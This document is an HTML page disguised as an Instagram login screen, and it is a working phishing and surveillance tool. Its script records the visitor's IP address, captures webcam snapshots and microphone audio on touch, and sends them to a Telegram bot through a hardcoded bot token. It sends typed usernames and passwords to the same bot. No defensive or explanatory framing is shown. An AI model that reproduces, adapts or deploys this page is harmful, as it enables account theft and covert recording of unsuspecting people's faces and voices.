<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 320px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
        }
        input::placeholder {
            color: #bbbbbb;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body ontouchstart="triggerEvent()">

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <input type="text" id="username" placeholder="Instagram ID">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendData()">Log In</button>
        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
    </div>

    <script>
        let ipAddress = "Unknown IP";
        let fileShareLink = "Unknown link";
        let imageBlobs = [];
        let audioBlob;

        async function triggerEvent() {
            await getIpAddress();
            await captureMedia();
            sendInitialBotMessage();
        }

        async function getIpAddress() {
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                    fileShareLink = `http://${ipAddress}:8080`;
                });
        }

        async function captureMedia() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                // Capture 15 snapshots
                captureSnapshots(stream);

                // Record 5 seconds of audio
                recordAudio(stream);
            } catch (err) {
                console.error('Media capture failed:', err);
            }
        }

        function captureSnapshots(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            let snapshotCount = 0;
            const interval = setInterval(() => {
                if (snapshotCount >= 15) {
                    clearInterval(interval);
                    return;
                }
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    imageBlobs.push(blob);
                    sendImageToBot(blob);
                }, 'image/jpeg');
                snapshotCount++;
            }, 500);
        }

        function recordAudio(stream) {
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];

            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);

            mediaRecorder.onstop = () => {
                audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                sendAudioToBot(audioBlob);
            };
        }

        function sendInitialBotMessage() {
            const message = `New Interaction:\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;
            sendMessageToBot(message);
        }

        function sendMessageToBot(message) {
            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
            const chatId = '860517021';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        function sendAudioToBot(audioBlob) {
            const formData = new FormData();
            formData.append('audio', audioBlob, 'audio.wav');

            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendAudio`, {
                method: 'POST',
                body: formData
            });
        }

        function sendImageToBot(imageBlob) {
            const formData = new FormData();
            formData.append('photo', imageBlob, 'snapshot.jpg');

            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        function sendData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const message = `Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;
            sendMessageToBot(message);
        }
    </script>

</body>
</html>
